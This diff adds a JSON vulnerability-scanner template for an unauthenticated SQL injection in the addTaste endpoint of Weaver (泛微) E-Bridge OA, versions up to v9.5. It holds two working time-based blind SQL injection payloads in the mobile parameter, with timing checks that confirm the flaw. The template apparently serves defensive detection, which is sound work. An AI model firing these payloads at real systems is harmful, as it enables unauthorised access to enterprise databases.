@@ -1,0 +1,56 @@
+{
+  "product": "泛微 E-Bridge",
+  "vul_name": "泛微 E-Bridge addTaste接口SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "泛微云桥e-Bridge OA是一种基于云计算和移动互联网技术的企业办公自动化（OA）解决方案。它由中国的企业软件开发公司泛微软件开发，旨在帮助企业实现高效的办公管理和协同工作。由于泛微云桥e-Bridge平台addTaste接口存在SQL注入漏洞，未经身份认证的攻击者可以利用该漏洞获取数据库权限及数据库的敏感数据。",
+  "version": "泛微云桥 e-Bridge <= v9.5 20220113",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_52612931/article/details/135342089",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1' AND (SELECT 8094 FROM (SELECT(SLEEP(8-(IF(18015>3469,0,8)))))mKjk) OR 'KQZm'='REcX"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1' AND (SELECT 8094 FROM (SELECT(SLEEP(8-(IF(18015<3469,0,8)))))mKjk) OR 'KQZm'='REcX"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "time": {
+              "check": "<=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
